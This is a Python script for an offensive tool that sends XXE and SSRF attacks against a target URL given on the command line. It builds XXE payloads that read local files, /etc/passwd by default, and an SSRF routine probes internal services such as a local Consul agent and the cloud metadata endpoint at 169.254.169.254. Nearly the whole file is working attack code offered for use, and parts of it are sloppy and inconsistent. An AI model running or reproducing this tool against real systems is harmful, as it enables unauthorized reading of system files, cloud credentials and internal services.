import request_maker
import argparse
import os,sys,re




#def Verbosity(v):
def content_type_changer(content_type):
	if(content_type=='x-www-form-urlencoded'):
		content_type="application/" + content_type
		header={'content-type':content_type}
	elif(content_type=='xml' or content_type=='json'):
		content_type="text/" + content_type
		header={'content-type':content_type}

	return header




def XXE_sample(uri,pdata,tp,content_type,target_file):

	if(pdata!=None): #if pdata is not null
		print 'pdata of xxe sample ' 
		print pdata # always need a pdata
	 	#target_file='file:///C:/Users/adrian/Desktop/rce.txt'
	 	payload=RM.Request_maker().XXEpayload(target_file) #your payload.
	 	
		decoded=RM.Request_maker().URLdecode(pdata,tp,payload,uri,content_type) #as of now pobre does not care about target parameter if content-type is xml, but it must be change.
		decode_pdata=decoded['post_data']
		uri=decoded['decoded_url']
	else:
		print 'xxe sample, pdata is nulls, some get request here'
		#target_file='file:///C:/Users/adrian/Desktop/rce.txt'
	 	x=RM.Request_maker().XXEpayload(target_file)
	 	print "your payload\n" + x
		decoded=RM.Request_maker().URLdecode(None,tp,x,uri,content_type)
		decode_pdata=decoded['post_data']
		print 'decoded' + decode_pdata
		uri=decoded['decoded_url']





	header=content_type_changer(content_type)


	print '\n SOME RESPONSE \n';
	container=RM.Request_maker().HTTPrequest(uri,None,header,decode_pdata)
	#print container['header']
	#print container['get_data'] 
	print "URL;" + container['targeturl'] + '\n\n'
	print 'body:' + container['body'] 
	regex=r'Invalid URI'
	results=re.findall(regex,container['body'])
	if(results[0]!=''):
		print 'it works but some error here: ' + results[0]



############################################
##############################################
def Brute_force(uri,pdata,tp,content_type):


	header=content_type_changer(content_type)


	
	##condition here that select port range or internal I.P , loopback service
	service_to_detect={'consul':['http://127.0.0.1:8500/v1/agent/self','consul'], #some service to detect, add some service here!
						'ec2/openstack':['http://169.254.169.254/','some strings'],
						'monit':['ADDR_HERE','some strings'],
						'solr':['ADDR_HERE','some strings'],
						'redis':['ADDR_HERE','some strings'],
						'memcahed':['ADDR_HERE','some strings'],
						'local_file':['file:///etc/passwd','some_strings']
						}

	for x in service_to_detect:

		if(pdata!=""): #if pdata is not null 

			decoded=RM.Request_maker().URLdecode(pdata,tp,x,uri)
			decode_pdata=decoded['post_data']
			uri=decoded['decoded_url']
		else:
			decoded=RM.Request_maker().URLdecode(None,tp,x,uri)
			decode_pdata=decoded['post_data']
			uri=decoded['decoded_url']


		print '\n SOME RESPONSE \n';
		container=RM.Request_maker().HTTPrequest(uri,None,header,decode_pdata)
		#print container['header']
		print "URL;" + container['target_uri'] + '\n\n'
		print 'body:' + container['body'] 
		#print container['get_data'] 
	




##http://stackoverflow.com/questions/5606083/how-to-set-and-retrieve-cookie-in-http-header-in-python









parser=argparse.ArgumentParser()
parser.add_argument('uri',help="target url",type=str)
parser.add_argument('--pdata','-pdata',help="POST parameters",type=str)
parser.add_argument('--target',help="target parameter", type=str)
#parser.add_argument('--scan',help="scan type", type=str, choices=['service','port'])
parser.add_argument('attack_type',help="type of  attack XXE,SSRF", type=str, choices=['XXE','SSRF'])
#parser.add_argument('--techique',help="techique such as open redirect,remote XXE", type=str, choices=['OR','OOB'])
#parser.add_argument('--selected_port', help="selected port to scan", type=list)
parser.add_argument('--content_type', help="content-type, defualt value: 'x-www-form-urlencoded'", choices=['xml','json','x-www-form-urlencoded'], default="x-www-form-urlencoded")
parser.add_argument('--target_file',help="your fucking target :", type=str)

args=parser.parse_args()
#extracting the argument
uri=args.uri
pdata=args.pdata
tp=args.target
content_type=args.content_type
target=args.target_file
if(target==None):
	target="file:///etc/passwd"
#selected_Port
#scan
type_of_attack=args.attack_type#type of attack.
RM=request_maker
if(type_of_attack=='XXE'):
	#os.system('start cmd /k python -m SimpleHTTPServer 1337')
	#content_type='xml'
	unknow='d'

elif(type_of_attack=='SSRF' and content_type=='xml'):
	print 'not supported :D'

elif(type_of_attack=='SSRF' and tp==''):
	print 'need a Target parameter'
elif((content_type=='xml' or content_type=='json') and pdata==None):

	print 'n0 post data here!'
	sys.exit()





#Brute_force(uri,pdata,tp,content_type)
XXE_sample(uri,pdata,tp,content_type,target)



#python xxe.py http://192.168.186.136/login None XXE -h

#
